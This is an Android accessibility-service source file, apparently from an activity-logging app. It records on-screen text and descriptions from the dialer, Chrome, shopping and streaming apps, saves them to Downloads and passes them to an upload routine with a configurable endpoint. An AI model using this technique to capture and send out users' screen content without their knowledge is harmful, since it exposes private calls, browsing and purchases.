package com.example.liveaction_int;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Environment;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.core.accessibilityservice.AccessibilityServiceInfoCompat;

import java.io.File;
import java.util.Calendar;

public class Accessibilty_service extends AccessibilityService {
String s2="";
    String must_dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getPath();
    String dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getPath() + File.separator + "lifeaction";
FileSender fs =new FileSender();
        Filewrite fw = new Filewrite();

    private static final String TAG = "MyAccessibilityService";
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        ConnectivityManager conMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo net = conMgr.getActiveNetworkInfo();
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = this.registerReceiver(null, ifilter);
        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING;

        SharedPreferences sh = getSharedPreferences("MySharedPref", MODE_PRIVATE);
         s2 = sh.getString("Userid", "");
        String abt = sh.getString("endpt", "");

        String data_str= "";
        final Calendar c = Calendar.getInstance();     // calender instance
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            AccessibilityNodeInfo rowNode = AccessibilityNodeInfo.obtain(source);
            int count = rowNode.getChildCount();
            for(int i=0; i<count ; i++){
                AccessibilityNodeInfo completeNode = rowNode.getChild(i);
                recur(completeNode, 1,event,c);

//                data_str = this.recur(completeNode, 1,event,c);
//                 fw.writeFile(data_str, s2,c,dir);

            }
        }

        fs.sender(abt,must_dir,dir,c,isCharging,net,s2);
    }
    private void recur(AccessibilityNodeInfo completeNode, int step, AccessibilityEvent event, Calendar c) {
        if (completeNode!= null ) {
        int cout = completeNode.getChildCount();
        String Data_str = "";
        try {
            if (cout == 0) {
                Log.e("SINGLE ELEMENT STEP", String.valueOf(step));


////////////////////////////////////////////////////
                /////data retriveing methods

                String Text = String.valueOf(completeNode.getText());
                String Content_Desc = String.valueOf(completeNode.getContentDescription());
                if((Text!="null")||(Content_Desc!="null")) {
                String str_ty = c.get(Calendar.YEAR) + "-" + String.valueOf(c.get(Calendar.MONTH) + 1) + "-" + c.get(Calendar.DATE) + ":" + c.get(Calendar.HOUR_OF_DAY) + ":" + c.get(Calendar.MINUTE) + ":" + c.get(Calendar.SECOND) + ":" + c.get(Calendar.MILLISECOND);
                String Pack_name = String.valueOf(completeNode.getPackageName());

                String Class_name = String.valueOf(completeNode.getClassName());

                String Event_type = String.valueOf(event.getEventType());

                Data_str = "~NewEvent:" + "event_info^" + Pack_name + "*" + Class_name + "*" + Event_type + "^text^" + Text + "^description^" + Content_Desc + "^event_time^" + str_ty;
                Log.e("SINGLE ELEMENT ", Data_str);
                fw.writeFile(Data_str, s2, c, dir);
//                Data_str = "";

                }


            } else {
                step++;

                for (int i = 0; i < cout; i++) {
                    AccessibilityNodeInfo completeNod = completeNode.getChild(i);
                    Log.e("CHILD_ELEMENT : ", String.valueOf(completeNod.getClassName()));
                     recur(completeNod, step, event, c);
                }
            }


        } catch (Exception e) {
            Log.e("exp", e.getMessage());

        }
    }

    }
    @Override
    public void onInterrupt() {

    }
    @Override
public void onServiceConnected(){
        super.onServiceConnected();

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED|AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED| AccessibilityEvent.TYPE_VIEW_CLICKED;
//        info.eventTypes = AccessibilityEvent.TYPE_WINDOWS_CHANGED | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED|
//                AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED|
//                AccessibilityServiceInfo.CAPABILITY_CAN_RETRIEVE_WINDOW_CONTENT | AccessibilityServiceInfo.FEEDBACK_VISUAL |
//                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS | AccessibilityEvent.WINDOWS_CHANGE_TITLE |
//                AccessibilityEvent.WINDOWS_CHANGE_ADDED | AccessibilityEvent.WINDOWS_CHANGE_CHILDREN |
//                AccessibilityServiceInfo.CONTENTS_FILE_DESCRIPTOR | AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED |
//                AccessibilityEvent.TYPE_WINDOWS_CHANGED | AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED |
//                AccessibilityEvent.TYPE_VIEW_CLICKED |
//                AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED | AccessibilityEvent.TYPE_VIEW_FOCUSED |
//                AccessibilityEvent.TYPE_VIEW_HOVER_ENTER | AccessibilityEvent.TYPE_VIEW_HOVER_EXIT |
//                AccessibilityEvent.TYPE_VIEW_LONG_CLICKED | AccessibilityEvent.TYPE_VIEW_SELECTED |
//                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED | AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED |
//                AccessibilityEvent.TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY;;//giving

        info.feedbackType = AccessibilityServiceInfoCompat.FEEDBACK_ALL_MASK;
        info.flags= AccessibilityServiceInfoCompat.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;

        info.packageNames = new String[]
                {"com.samsung.android.dialer","com.jio.media.ondemand","com.sec.android.app.launcher","com.flipkart.android","com.android.chrome","com.amazon.avod.thirdpartyclient"," com.spotify.music","com.netflix.mediaclient", "in.startv.hotstar","com.myntra.android","com.sonyliv","com.snapdeal.main","com.google.android.youtube","com.graymatrix.did","com.jio.media.jiobeats"};
////////,"com.android.systemui"/// notification class
        info.notificationTimeout = 100;

        this.setServiceInfo(info);
        Log.e(TAG, "onServiceConnected: ");
    }
}
